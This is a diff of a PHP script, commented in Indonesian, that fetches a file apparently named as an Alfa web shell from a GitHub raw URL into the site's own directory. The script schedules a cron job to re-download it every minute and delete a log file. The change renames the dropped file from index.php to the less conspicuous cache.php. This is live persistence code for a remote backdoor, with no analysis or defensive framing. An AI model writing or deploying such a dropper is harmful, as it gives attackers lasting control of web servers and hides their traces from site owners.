@@ -6,7 +6,7 @@ $urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/zxsan/main/alfa
 $currentDirectory = dirname(__FILE__);
 
 // Buat perintah wget
-$downloadCommand = '/usr/bin/wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/index.php');
+$downloadCommand = '/usr/bin/wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/cache.php');
 
 // Tugas Cron untuk mengunduh file setiap 30 detik dan kemudian menghapus log
 $downloadCronCommand = '* * * * * ' . $downloadCommand . ' > /dev/null 2>&1 && rm ' . escapeshellarg($currentDirectory . '/logfile.log');
